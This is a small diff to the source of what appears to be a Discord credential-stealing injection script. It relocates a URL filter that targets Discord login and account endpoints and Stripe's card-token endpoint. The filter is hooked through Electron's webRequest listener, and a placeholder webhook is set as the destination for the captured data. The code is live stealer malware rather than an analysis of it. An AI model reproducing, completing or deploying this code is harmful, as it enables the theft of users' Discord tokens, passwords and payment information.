@@ -6,6 +6,9 @@ const {
 const querystring = require("querystring");
 const os = require('os')
 const webhook = "%WEBHOOK%";
+const Filter = {
+    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
+};
 
 
 const config = {
@@ -790,11 +793,6 @@ function getNitro(flags) {
 
     };
 }
-
-const Filter = {
-    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
-};
-
 
 session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) => {
     if (details.statusCode != 200) return;
